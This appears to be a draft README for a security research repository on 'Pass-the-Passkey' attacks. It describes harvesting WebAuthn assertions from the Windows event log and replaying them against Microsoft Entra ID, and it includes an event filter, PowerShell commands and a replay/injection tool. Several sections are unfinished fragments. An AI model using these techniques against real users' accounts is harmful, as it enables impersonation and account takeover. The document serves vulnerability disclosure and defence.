@@ -1,0 +1,563 @@
+# Pass-the-Passkey Family of Attacks
+
+This repository contains a collection of tools and resources related to the Pass-the-Passkey family of attacks,
+which target WebAuthn and FIDO2 authentication mechanisms.
+These tools are designed for security researchers and penetration testers to assess the security of systems utilizing passkey-based authentication.
+
+> [!WARNING]
+> The techniques described in this repository are intended for educational purposes only.
+> Unauthorized use of these procedures may violate laws and regulations.
+
+## Why Pass-the-Passkey?
+
+Pass-the-*, Pass-the-Hash, NTLM Relay
+
+
+Benjamin Delpy, Mimikatz
+
+Pass-the-Assertion Attack
+
+man-in-the-machine attack
+
+## Tools
+
+### Passkey Injector
+
+[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Windows 11](https://badgen.net/badge/icon/11?icon=windows&label=Windows)](#)
+[![.NET 10.0+](https://img.shields.io/badge/Runtime-10.0%2B-007FFF.svg?logo=.net)](#)
+[![Visual Studio 2026](https://img.shields.io/badge/Visual%20Studio-2026-383278.svg)](#)
+[![Visual Studio Code](https://img.shields.io/badge/Visual%20Studio-Code-007ACC.svg?logo=visual-studio-code)](#)
+[![CI Build](https://github.com/SpecterOps/pass-the-passkey/actions/workflows/autobuild.yml/badge.svg)](#)
+
+The Passkey Injector is a simple web browser, internally using the Edge WebView2 control,
+that intercepts WebAuthn assertion requests and allows injection of responses in JSON format.
+
+![Screenshot of Passkey Injector](Assets/passkey-injector.png)
+
+There are multiple use cases for tampering with the Passskey authentication flow, including:
+
+- Replay of captured assertions from network traffic or browser logs.
+- Phishing attacks by forwarding attacker-controlled assertions.
+- Injection of modified assertions to test server-side validation.
+- Analysis of WebAuthn features and extensions used by a particular cloud service.
+- Learning how the WebAuthn protocol works.
+
+### FIDO2 UI
+
+### Windows Event Log Filters
+
+#### Credential Capture Filter
+
+## Attacks
+
+> [!IMPORTANT]
+> The attacks described in this document worked at the time of writing.
+> However, vendors might have already deployed mitigations in response to the disclosed vulnerabilities.
+
+### Passkey Assertion Mining via Windows Event Log
+
+#### Classification
+
+| Framework    | ID          | Description |
+| ------------ | ----------- | ----------- |
+| CWE          | [CWE-532]   | Insertion of Sensitive Information into Log File |
+|              | [CWE-200]   | Exposure of Sensitive Information to an Unauthorized Actor |
+|              | [CWE-312]   | Cleartext Storage of Sensitive Information |
+| MITRE ATT&CK | [T1552.001] | Unsecured Credentials: Credentials In Files |
+|              | [T1005]     | Data from Local System |
+|              | [T1119]     | Automated Collection |
+|              | [T1212]     | Exploitation for Credential Access |
+|              | [TA0004]    | Privilege Escalation |
+| CVSS 3.1     | [8.6 (High)][CVSS1] | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:U/RC:C |
+| [MSRC]       | VULN-171317 | Passkey Assertions Written to Windows Event Log |
+
+[CWE-532]: https://cwe.mitre.org/data/definitions/532.html
+[CWE-200]: https://cwe.mitre.org/data/definitions/200.html
+[CWE-312]: https://cwe.mitre.org/data/definitions/312.html
+[T1552.001]: https://attack.mitre.org/techniques/T1552/001
+[T1005]: https://attack.mitre.org/techniques/T1005
+[T1119]: https://attack.mitre.org/techniques/T1119
+[T1212]: https://attack.mitre.org/techniques/T1212
+[TA0004]: https://attack.mitre.org/tactics/TA0004
+[CVSS1]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:U/RC:C&version=3.1
+
+#### Overview
+
+We have discovered that **Windows 11 writes full WebAuthn assertions into the event log** when using passkey-based authentication:
+
+![Screenshot of a WebAuthn assertion in Windows Event Log](Assets/event-log-webauthn-assertion.png)
+
+The behavior is the same for all device-bound passkeys, including the platform authenticator, i.e., Windows Hello,
+and roaming authenticators, e.g., YubiKeys. Synced passkeys, e.g., 1Password or BitWarden, seem to be unaffected.
+
+The logged JSON payload is actually the [PublicKeyCredential](https://www.w3.org/TR/webauthn/#iface-pkcredential) data structure
+containing an [AuthenticatorAssertionResponse](https://www.w3.org/TR/webauthn/#iface-authenticatorassertionresponse).
+This data is security-sensitive, as it can be used to impersonate the user against the target web application.
+All relevant fields are included, e.g., challenge, authenticator data, signature, user handle, and credential ID.
+Here is a sample event log entry in XML format:
+
+```xml
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System>
+  <Provider Name="Microsoft-Windows-WebAuthN" Guid="{3ae1ea61-c002-47fb-b06c-4022a8c98929}" />
+  <EventID>2106</EventID>
+  <Version>0</Version>
+  <Level>4</Level>
+  <Task>503</Task>
+  <Opcode>12</Opcode>
+  <Keywords>0x8000000000000002</Keywords>
+  <TimeCreated SystemTime="2026-01-20T23:19:01.4449382Z" />
+  <EventRecordID>16938</EventRecordID>
+  <Correlation ActivityID="{0f018d42-8382-4fff-a19f-d1ab00000000}" />
+  <Execution ProcessID="32708" ThreadID="12676" />
+  <Channel>Microsoft-Windows-WebAuthN/Operational</Channel>
+  <Computer>CONTOSO-PC1</Computer>
+  <Security UserID="S-1-5-21-1084105731-826279734-3585910670-1327" />
+ </System>
+ <EventData>
+  <Data Name="Name">authenticationResponseJSON</Data>
+  <Data Name="Value">{"authenticatorAttachment":"platform","clientExtensionResults":{},"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","response":{"authenticatorData":"NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAg","clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtsc1FtcFhSR3MwVWpGbk1FMXFRbFZOVm1jeVl6QktSV0V6Y0c5VlZ6RjRXak5rVGxaVFNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJXVEpvYUdKSGVHeGliV1JzU1dsM2FXRllUbnBKYW05cFlVaFNNR05JVFRaTWVUbHpZakprY0dKcE5YUmhWMDU1WWpOT2RscHVVWFZaTWpsMFNXbDNhV0ZYUmpCSmFtOTRUbnBaTkU5VVZYaE5WRTE1VEVOS2RWbHRXV2xQYWtVelRtcG5OVTVVUlhoTmVrbHpTVzFXTkdORFNUWk5WR015VDBSck1VMVVVWHBOYmpBdVNEQnhOblJwZFZwdFMwcEhkMlZuWldobGRrd3pjR3hpU1UxWVUwMWFTSFpaYkhocmRtdEtVSEZQU3pWR2FXZExjR1ZHTkVzMFh6VjRjVnBvWlZsWVozZDZNa05zWkdGTWF6UTBaRUozWDNKUU9FMXNWRWR1TWxsUk9YRlViR1EyZFVKVGVHbGFkM0JzU3pGSE9EaGlNalJRVW5WUGJGODFNWFpKV0dGVU5XRkJUbVZDUm5GUGQzUlBXbDlYY0VSa1kwVXdiMjlXWkhKMGJYZGZZbU5zYVVwR1ltRjZiVzlzTUdFdFN6WlhNVzVSWHpSVVkweGZZa3gxZFZoeVNHVnRRall4Vlc5aU1VMHpXakpwY21zNWQyZzFWemhhYTNVMFVHYzRibkp5ZERobmNtaHlaRXhpY0ZCTVRVNHdjakUxUlcxaFZVUTNRVmR6Y0dnM1gydG9kMHcyTm1oMGFtbGhPR295Um04dFNYSkZUeTFtWm01T1NWZGFaSFV0Tm1acGNYaHdia1paVDI5R1JsQjJXamRKUXpOaFoyaGlVSGhtWXpCWk1GWklabXhyWkU5bFoweG1jVEo0UVZkblVHdzViRU5uVEhkbiIsIm9yaWdpbiI6Imh0dHBzOi8vbG9naW4ubWljcm9zb2Z0LmNvbSIsImNyb3NzT3JpZ2luIjpmYWxzZX0","signature":"MEUCIA8EKq1vxqcXzZmXR55iX_Joodr_4r8PBvBk0v03iKhaAiEA_2A1_0WHAjZFPMwJH0P1YjqPSz71Vxe9iX4lIco29tc","userHandle":"0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"},"type":"public-key"}</Data>
+ </EventData>
+</Event>
+```
+
+We see the browser process ID and user SID being included, but the most important part is the JSON payload:
+
+```json
+{
+  "authenticatorAttachment": "platform",
+  "clientExtensionResults": {},
+  "id": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
+  "rawId": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
+  "response": {
+    "authenticatorData": "NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAg",
+    "clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZ
+    MmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtsc1FtcFhSR3MwVWpGbk1FMXFRbFZOVm1jeVl6QktSV0V6Y0c5VlZ6RjRXak5rVGxaVFNqa3
+    VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJXVEpvYUdKSGVHeGliV1JzU1dsM2FXRllUbnBKYW05cFlV
+    aFNNR05JVFRaTWVUbHpZakprY0dKcE5YUmhWMDU1WWpOT2RscHVVWFZaTWpsMFNXbDNhV0ZYUmpCSmFtOTRUbnBaTkU5VVZYaE5WRTE1VEVOS2
+    RWbHRXV2xQYWtVelRtcG5OVTVVUlhoTmVrbHpTVzFXTkdORFNUWk5WR015VDBSck1VMVVVWHBOYmpBdVNEQnhOblJwZFZwdFMwcEhkMlZuWldo
+    bGRrd3pjR3hpU1UxWVUwMWFTSFpaYkhocmRtdEtVSEZQU3pWR2FXZExjR1ZHTkVzMFh6VjRjVnBvWlZsWVozZDZNa05zWkdGTWF6UTBaRUozWD
+    NKUU9FMXNWRWR1TWxsUk9YRlViR1EyZFVKVGVHbGFkM0JzU3pGSE9EaGlNalJRVW5WUGJGODFNWFpKV0dGVU5XRkJUbVZDUm5GUGQzUlBXbDlY
+    Y0VSa1kwVXdiMjlXWkhKMGJYZGZZbU5zYVVwR1ltRjZiVzlzTUdFdFN6WlhNVzVSWHpSVVkweGZZa3gxZFZoeVNHVnRRall4Vlc5aU1VMHpXak
+    pwY21zNWQyZzFWemhhYTNVMFVHYzRibkp5ZERobmNtaHlaRXhpY0ZCTVRVNHdjakUxUlcxaFZVUTNRVmR6Y0dnM1gydG9kMHcyTm1oMGFtbGhP
+    R295Um04dFNYSkZUeTFtWm01T1NWZGFaSFV0Tm1acGNYaHdia1paVDI5R1JsQjJXamRKUXpOaFoyaGlVSGhtWXpCWk1GWklabXhyWkU5bFoweG
+    1jVEo0UVZkblVHdzViRU5uVEhkbiIsIm9yaWdpbiI6Imh0dHBzOi8vbG9naW4ubWljcm9zb2Z0LmNvbSIsImNyb3NzT3JpZ2luIjpmYWxzZX0",
+    "signature": "MEUCIA8EKq1vxqcXzZmXR55iX_Joodr_4r8PBvBk0v03iKhaAiEA_2A1_0WHAjZFPMwJH0P1YjqPSz71Vxe9iX4lIco29tc",
+    "userHandle": "0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"
+  },
+  "type": "public-key"
+}
+```
+
+After decoding the cliendDataJSON field from Base64Url format, we obtain yet another JSON structure:
+
+```json
+{
+  "type": "webauthn.get",
+  "origin": "https://login.microsoft.com",
+  "crossOrigin":false,
+  "challenge": "Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJMU5pSXNJbmcxZENJNklsQmpXRGs0UjFnME1qQlVNVmcyYzBKRWEzcG9VVzF4WjNkTl
+  ZTSjkuZXlKaGRXUWlPaUoxY200NmJXbGpjbTl6YjJaME9tWnBaRzg2WTJoaGJHeGxibWRsSWl3aWFYTnpJam9pYUhSMGNITTZMeTlzYjJkcGJpNXRhV055YjNOdl
+  puUXVZMjl0SWl3aWFXRjBJam94TnpZNE9UVXhNVE15TENKdVltWWlPakUzTmpnNU5URXhNeklzSW1WNGNDSTZNVGMyT0RrMU1UUXpNbjAuSDBxNnRpdVptS0pHd2
+  VnZWhldkwzcGxiSU1YU01aSHZZbHhrdmtKUHFPSzVGaWdLcGVGNEs0XzV4cVpoZVlYZ3d6MkNsZGFMazQ0ZEJ3X3JQOE1sVEduMllROXFUbGQ2dUJTeGlad3BsSz
+  FHODhiMjRQUnVPbF81MXZJWGFUNWFBTmVCRnFPd3RPWl9XcERkY0Uwb29WZHJ0bXdfYmNsaUpGYmF6bW9sMGEtSzZXMW5RXzRUY0xfYkx1dVhySGVtQjYxVW9iMU
+  0zWjJpcms5d2g1Vzhaa3U0UGc4bnJydDhncmhyZExicFBMTU4wcjE1RW1hVUQ3QVdzcGg3X2tod0w2Nmh0amlhOGoyRm8tSXJFTy1mZm5OSVdaZHUtNmZpcXhwbk
+  ZZT29GRlB2WjdJQzNhZ2hiUHhmYzBZMFZIZmxrZE9lZ0xmcTJ4QVdnUGw5bENnTHdn"
+}
+```
+
+The `origin` field can be used to identify the relying party (i.e., the cloud service).
+
+Here is a filter XML that can be used to search for these events in the Windows Event Log:
+
+```xml
+<QueryList>
+  <Query Id="0" Path="Microsoft-Windows-WebAuthN/Operational">
+    <Select>*[System[EventID=2106] and EventData[Data[@Name='Name']='authenticationResponseJSON`n']]</Select>
+  </Query>
+</QueryList>
+```
+
+> [!NOTE]
+> Windows incorrectly puts a newline character (`\n`) at the end of the `authenticationResponseJSON` field in the event log.
+> The filter XML above accounts for this quirk. Unfortunately, it only works in PowerShell or Win32 API, but not in the Event Viewer GUI.
+
+These logged assertions can be replayed to impersonate the user without needing access to the original authenticator device.
+
+#### Client-Side Requirements
+
+The adversary must have local or network access to the Windows 11 machine performing Passkey authentication.
+For local access, membership in the **Users** group is sufficient.
+For remote access, the adversary needs to be a member of one of the following groups:
+
+- Event Log Readers
+- Remote Desktop Users
+- Remote Management Users
+- Administrators
+
+Even with local administrative privileges on the target machine,
+this attack could result in serious privilege escalation into cloud services.
+
+#### Server-Side Requirements
+
+The following server-side conditions must be met for the attack to succeed:
+
+- The relying party does not check [challenge (nonce)](https://www.w3.org/TR/webauthn/#sctn-cryptographic-challenges) reuse.
+- The challenge is not bound to the user's session.
+- [Signature counters](https://www.w3.org/TR/webauthn/#sctn-sign-counter) are not tracked.
+
+We have verified that none of these checks are performed by Microsoft Entra ID ([login.microsoft.com](https://login.microsoft.com)), which further increases the severity of this vulnerability.
+
+#### Attack Execution
+
+To demonstrate this vulnerability, the [Get-PasskeyAssertionEvent.ps1](Src/Scripts/Get-PasskeyAssertionEvent.ps1) PowerShell script
+retrieves recent WebAuthn assertions from the event log of a remote Windows machine
+and extracts the `origin` field from the `clientDataJSON`:
+
+```powershell
+.\Get-PasskeyAssertionEvent.ps1 -ComputerName 'CONTOSO-PC1'
+```
+
+Sample script output (truncated):
+
+```txt
+TimeCreated         : 1/21/2026 12:19:01 AM
+MachineName         : CONTOSO-PC1
+ProcessId           : 32708
+UserID              : S-1-5-21-1084105731-826279734-3585910670-1327
+UserName            : CONTOSO\alice
+Origin              : https://login.microsoft.com
+PublicKeyCredential : {"authenticatorAttachment":"platform",...,"type":"public-key"}
+```
+
+As a next step, the retrieved `PublicKeyCredential` JSON payload
+can be passed to the **SpecterOps Passkey Injector** tool to impersonate the user.
+The entire process could be fully automated by extending the PowerShell script.
+
+#### Conclusion
+
+The exploit would satisfy the phishing-resistant multifactor authentication requirement in conditional access policies,
+and is much easier to execute than traditional session hijacking techniques.
+We have not noticed any XDR alerts or other security mechanisms being triggered during our tests.
+
+#### Disclosure Timeline
+
+| Date         | Event                                                            |
+| ------------ | ---------------------------------------------------------------- |
+| 2026-01-16   | Vulnerability discovered during internal research.               |
+| 2026-01-21   | Initial disclosure to Microsoft Security Response Center (MSRC). |
+
+### Passkey Replay Attack
+
+#### Classification
+
+| Framework    | ID        | Description |
+| ------------ | --------- | ----------- |
+| CWE          | [CWE-294] | Authentication Bypass by Capture-replay |
+|              | [CWE-287] | Improper Authentication |
+| MITRE ATT&CK | [T1550]   | Use Alternate Authentication Material |
+|              | [TA0004]  | Privilege Escalation |
+| CVSS 3.1     | [7.8 (High)][CVSS2] | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H/E:F/RL:X/RC:X |
+| [MSRC]       | VULN-171325 | Entra ID WebAuthn Assertion Replay Attack Vulnerability |
+
+[CWE-294]: https://cwe.mitre.org/data/definitions/294.html
+[CWE-287]: https://cwe.mitre.org/data/definitions/287.html
+[T1550]: https://attack.mitre.org/techniques/T1550
+[CVSS2]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H/E:F/RL:X/RC:X&version=3.1
+[MSRC]: https://msrc.microsoft.com
+
+#### Overview
+
+Since its first public draft, the WebAuthn protocol specification contained mitigations against
+assertion replay attacks, primarily through the use of cryptographic challenges (nonce)
+and device-bound signature counters. However, not all implementations seem to fully adhere to these security recommendations.
+
+We have tested multiple cloud services and we have identified Microsoft Entra ID to be particularly vulnerable to replay attacks.
+By itself, this vulnerability is not very severe, as a malicious actor would first need to be able to intercept HTTPS traffic
+between a client computer and Microsoft Entra ID servers, which would open more straightforward attack vectors, e.g., session hijacking.
+However, when combined with the previously described **Passkey Assertion Mining via Windows Event Log** vulnerability,
+the overall attack chain becomes much more practical and dangerous.
+
+#### Challenge Replay Vulnerability
+
+The Microsoft Entra ID engineering team has decided to forgo certain security
+checks to ensure scalability and performance. Instead of storing each issued
+challenge in a server-side database, they chose to replace randomly generated challenges
+with short-lived digitally signed JWT tokens.
+
+Here is a sample WebAuthn challenge issued by Microsoft Entra ID:
+
+```txt
+Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJMU5pSXNJbmcxZENJNklsQmpXRGs0UjFnME1q
+QlVNVmcyYzBKRWEzcG9VVzF4WjNkTlZTSjkuZXlKaGRXUWlPaUoxY200NmJXbGpjbTl6YjJaME9tWnBa
+Rzg2WTJoaGJHeGxibWRsSWl3aWFYTnpJam9pYUhSMGNITTZMeTlzYjJkcGJpNXRhV055YjNOdlpuUXVZ
+Mjl0SWl3aWFXRjBJam94TnpZNE9UUTNOVFEzTENKdVltWWlPakUzTmpnNU5EYzFORGNzSW1WNGNDSTZN
+VGMyT0RrME56ZzBOMzAuSWQ4YUMyNXQya2xjY3V3RzlTcjhvczVPd05QdExRWF9vZURGTVhtSmh5OGlK
+TU15b2d3enUtUGZHN3N0OW5zUFZHT05FUzdpeGZnbGVCZTYzUldkWXNpMTh6emNubGJGQkk4NFh6MDlf
+SzN4VFV0SEJyNUFHc084MUFHRjhkT3cyd3ZNVTFKTWJaY0VraV9Qa3dzaUdBcG1Gd2M3Tmc2dmg5b0JY
+QTJOdExONnZBaUNSSU9XX1ZYRlpOWXF2Nkl4eUpLZG5SVDNJMGRjVkFnNlM4OE5YRGNoYU84b1E0YTNB
+RlFLYThBRjItaHN0YVBlemM4QWx3YkkyaUFBSEFaWHhLazFyWVdXcUVVVzlucW1PT1pIVk1GMDliN0FZ
+X1pjdHJYY0kwdHlYU0lUYW1fb1U1M3R3cVBpN3B6c09EU0NaZG9WWGxRSEcxQ2pld2VpTXQyLUh3
+```
+
+After decoding it from the Base64 format, we get a well-formed JWT structure prepended with the non-standard leading `O.` sequence:
+
+```txt
+O.eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlBjWDk4R1g0MjBUMVg2c0JEa3poUW1xZ3dNVSJ9.
+eyJhdWQiOiJ1cm46bWljcm9zb2Z0OmZpZG86Y2hhbGxlbmdlIiwiaXNzIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3
+NvZnQuY29tIiwiaWF0IjoxNzY4OTQ3NTQ3LCJuYmYiOjE3Njg5NDc1NDcsImV4cCI6MTc2ODk0Nzg0N30.
+Id8aC25t2klccuwG9Sr8os5OwNPtLQX_oeDFMXmJhy8iJMMyogwzu-PfG7st9nsPVGONES7ixfgleBe63RWdYs
+i18zzcnlbFBI84Xz09_K3xTUtHBr5AGsO81AGF8dOw2wvMU1JMbZcEki_PkwsiGApmFwc7Ng6vh9oBXA2NtLN6
+vAiCRIOW_VXFZNYqv6IxyJKdnRT3I0dcVAg6S88NXDchaO8oQ4a3AFQKa8AF2-hstaPezc8AlwbI2iAAHAZXxK
+k1rYWWqEUW9nqmOOZHVMF09b7AY_ZctrXcI0tyXSITam_oU53twqPi7pzsODSCZdoVXlQHG1CjeweiMt2-Hw
+```
+
+After decoding the Base64Url-encoded UTF-8 strings, we obtain the following JWT header and payload:
+
+```json
+{
+  "typ": "JWT",
+  "alg": "RS256",
+  "x5t": "PcX98GX420T1X6sBDkzhQmqgwMU"
+}
+```
+
+```json
+{
+  "aud": "urn:microsoft:fido:challenge",
+  "iss": "https://login.microsoft.com",
+  "iat": 1768947547,
+  "nbf": 1768947547,
+  "exp": 1768947847
+}
+```
+
+The JWT payload indicates that the challenge is valid for only 5 minutes.
+However, our tests have shown that Microsoft Entra ID accepts challenges
+up to 10 minutes after issuance.
+Use of an expired challenge would result in an authentication failure:
+
+![Screenshot of an Entra ID challenge expired error](Assets/azure-challenge-expired.png)
+
+However, the 10-minute validity period provides a sufficient window
+for an attacker to capture and replay the signed challenge.
+
+#### Signature Counter Replay Vulnerability
+
+Microsoft Entra ID does not track or enforce signature counters for WebAuthn assertions.
+This omission allows attackers to reuse previously captured assertions to impersonate users.
+
+Before [Microsoft retired the Azure AD Graph API](https://techcommunity.microsoft.com/blog/microsoft-entra-blog/important-update-azure-ad-graph-retirement/4364990),
+it was possible to retrieve the signature counter value for each registered passkey in an Entra ID tenant
+using the [DSInternals PowerShell module](https://github.com/MichaelGrafnetter/DSInternals):
+
+```powershell
+Install-Module -Name AzureAD,DSInternals -Force
+Connect-AzureAD
+$token = [Microsoft.Open.Azure.AD.CommonLibrary.AzureSession]::AccessTokens['AccessToken'].AccessToken
+Get-AzureADUserEx -All -Token $token |
+    Where-Object Enabled -eq $true |
+    Select-Object -ExpandProperty KeyCredentials |
+    Where-Object Usage -eq FIDO |
+    Format-Table -View FIDO
+```
+
+Sample output:
+
+```txt
+DisplayName               AAGUID                               Alg   Counter Created    Owner
+-----------               ------                               ---   ------- -------    -----
+Feitian BioPass FIDO2     77010bd7-212a-4fc9-b236-d2ca5e9d4084 ES256     261 2019-08-26 george@contoso.com
+YubiKey 5                 fa2b99dc-9e39-4257-8f92-4a30d23c4118 ES256     229 2019-08-26 jill@contoso.com
+eWBM Goldengate G310      95442b2e-f15e-4def-b270-efb106facb4e ES256      48 2019-08-29 joe@contoso.com
+```
+
+Based on our experiments, the values in the `Counter` column were populated during passkey registration,
+but they were never updated during subsequent authentications.
+The reason behind this non-standard behavior might be the way Entra ID stores these values.
+According to our previous research, a single undocumented `searchableDeviceKey` multi-valued user attribute holds all FIDO2 keys (passkeys),
+Windows Hello for Business keys (NGC keys), and Microsoft Authenticator passwordless keys.
+In hybrid environmnets this property is synchronized to the `msDS-KeyCredentialLink` user attribute in Active Directory Domain Services (AD DS) using Microsoft Entra Connect.
+Whenever this attribute is updated, e.g., during new device registration, a user modification event is generated in Entra ID Audit Logs.
+
+This design choice likely complicates tracking and updating individual signature counters,
+as all sign-ins would otherwise trigger AD writebacks and SPAM audit logs.
+Up-to-date signature counters could obviously be stored in a different, non-public attribute,
+but the observed behavior suggests otherwise.
+
+#### Advanced Security and Analytics
+
+We tested the replay attack against users assigned the Microsoft 365 E5 license,
+which includes Entra Identity Protection and Defender for Identity.
+No alerts or other security signals were generated during or after our tests.
+
+#### Disclosure Timeline
+
+| Date         | Event                                                            |
+| ------------ | ---------------------------------------------------------------- |
+| 2026-01-16   | Vulnerability discovered during internal research.               |
+| 2026-01-21   | Initial disclosure to Microsoft Security Response Center (MSRC). |
+
+### Passkey Circuit Breaker Attack
+
+#### Overview
+
+Even if the replay attack is not feasible due to server-side mitigations,
+a fast-enough adversary might still be able to forward the WebAuthn assertion
+before the legitimate user does so. A network outage, browser freeze, OS hang,
+or a power outage could delay the legitimate authentication attempt,
+allowing the malicious actor to succeed.
+
+If malware is already present on the client machine,
+the success rate of this attack can be significantly increased by terminating
+or temporarily suspending the browser process before it manages to send the assertion.
+
+#### Attack Execution
+
+### Windows UI Overlay Attack
+
+#### Overview
+
+Not possible - Access denied
+
+Windows process
+WebAuthn
+
+#### Attack Execution
+
+### Remote Desktop Passkey Phishing Attack
+
+![RDP client WebAuthn pass-through settings screenshot](Assets/rdp-webauthn-settings.png)
+
+### Passkey Prompt Spamming Attack
+
+### Application Identifier Spoofing Attack
+
+### Passkey to Token Attack
+
+#### Overview
+
+If automation tools or scripts are to be used in a next step after successful passkey authentication,
+OAuth 2.0 access tokens need to be obtained first.
+
+#### Attack Execution
+
+The traditional way to fetch tokens from a browser session is openig the Developer Tools
+and extracting the [ESTSAUTH cookie](https://learn.microsoft.com/en-us/entra/identity/authentication/concept-authentication-web-browser-cookies).
+Tools like Fabian Bader's [TokenTactics v2](https://github.com/f-bader/TokenTacticsV2) can then be used to exchange the cookie for tokens.
+
+The Passkey Injector tool also supports automating this process by directly invoking the [OAuth 2.0 Authorization Code flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow) and displaying the obtained tokens.
+
+![OpenID Connect Request UI](Assets/oidc-token-request.png)
+
+![OpenID Connect Token Response UI](Assets/oidc-token-response.png)
+
+We did not want to limit this functionality to injected WebAuthn assertions only.
+Passkey Injector tool can therefore invoke the built-in Passkey authentication prompt as well.
+
+![Fallback to built-in WebAuthn prompt](Assets/passkey-authentication-fallback.png)
+
+### Passkey Detour Attack
+
+### User Verification Bypass Attack
+
+Silent Passkey Assertion Attack
+
+### Passkey Persistence Attack
+
+## Roads Not Taken
+
+### Evil Authenticator Plugin Attack
+
+Although Windows 11 supports third-party passkey authenticators via plugins,
+we have not identified any vulnerabilities in this area so far.
+We were also unable to use a custom authenticator plugin to intercept
+and manipulate passkey creation or authentication requests,
+as the Windows API only exposes `clientDataHash` instead of the full `clientDataJSON` to these plugins.
+
+![Passkey authenticator plugins registered in Windows](Assets/passkey-plugin-list.png)
+
+![Passkey registration prompt showing authenticator selection](Assets/passkey-plugin-register.png)
+
+Nevertheless, developing our own passkey authenticator plugin in C# turned out to be an interesting exercise,
+as it involved implementing the `IPluginAuthenticator` COM interface (UUID: `d26bcf6f-b54c-43ff-9f06-d5bf148625f7`), exposing it through an out-of-process COM server,
+and registering it in Windows through an MSIX package. Needless to say, there is very little documentation available for this task.
+
+Due to the complexity of creating passkey authenticator plugins,
+existing third-party implementations, such as 1Password, Bitwarden, and KeePassXC,
+should be audited carefully to ensure they do not introduce unexpected vulnerabilities.
+
+### Evil Browser Extension Attack
+
+## Recommendations for IT Administrators
+
+- Update Windows 11 to the latest version.
+- Do not rely solely on the phishing-resistant multifactor authentication requirement
+  in conditional access policies for high-value identities and applications.
+- Block execution of unauthorized application and browser extensions.
+- Stay alert and do not confirm unexpected passkey prompts.
+
+## Recommendations for Web Application Developers
+
+- Properly implement all server-side checks as per the WebAuthn specification.
+- Conduct penetration tests of your WebAuthn implementation.
+- Prefer using robust WebAuthn SDKs instead of building custom solutions.
+- Consider binding the WebAuthn challenges to user sessions.
+- Do not store sensitive authentication data in logs.
+
+## Previous Research
+
+### Passkeys Pwned: Turning WebAuthn Against Itself
+
+Researchers from SquareX Labs [created a malicious browser extension](https://labs.sqrx.com/passkeys-pwned-0dbddb7ade1a) that intercepts passkey creation requests
+and allows attackers to register their own authenticators instead of the legitimate ones.
+
+▶ Level 3+
+▶ Protect against high level local HW attacks
+▶ Built on Common Criteria certified Secure Element with AVA_VAN.
+
+### Security Issue with Bluetooth Low Energy (BLE) Titan Security Keys
+
+Older Google Titan U2F Security Keys using Bluetooth Low Energy (BLE)
+were found to [contain a vulnerable implementation of the Bluetooth pairing protocol](https://security.googleblog.com/2019/05/titan-keys-update.html),
+allowing attackers in proximity to intercept and manipulate communications between the key and the host device.
+
+### A Side Journey to Titan
+
+https://ninjalab.io/a-side-journey-to-titan/
+
+we will show how we found a side-channel vulnerability in the cryptographic
+implementation of Google Titan Security Key’s secure element (we assigned CVE-2021-3011).
+Our contribution is threefold:
+
+ulnerability with a custom lattice-based attack and fully recover an ECDSA
+private key from the Google Titan Security Key (see Chapter 4
+
+![Google Titan PCB](https://www.researchgate.net/profile/Victor-Lomne/publication/369998819/figure/fig2/AS:11431281145513546@1681424176281/Google-Titan-Security-Key-PCB-with-annotated-main-parts.jpg)
+
+### How Not to Handle Keys: Timing Attacks on FIDO Authenticator Privacy
+
+How Not to Handle Keys: Timing Attacks on FIDO Authenticator Privacy
+https://petsymposium.org/popets/2022/popets-2022-0129.pdf
+
+### FIDO2 Deception Attack via Overlays exploiting Limited Display Authenticators (FIDOLA)
+
+In the [Breaching Security Keys without Root: FIDO2 Deception Attacks via Overlays exploiting Limited Display Authenticators](https://dl.acm.org/doi/10.1145/3658644.3690286) paper,
+the authors discuss various ways attackers can use overlay attacks to trick users into approving malicious authentication requests.
+
+### MITM
+
+Use Evilginx to inject challenges HTTPS traffic
+
+[Hook, Line and Sinker: Phishing Windows Hello for Business](https://medium.com/@yudasm/bypassing-windows-hello-for-business-for-phishing-181f2271dc02)
+
+### Synchronized Passkeys
+
+## Author
+
+### Michael Grafnetter
+
+[![Twitter](https://img.shields.io/twitter/follow/MGrafnetter.svg?label=Twitter%20@MGrafnetter&style=social)](https://x.com/MGrafnetter)
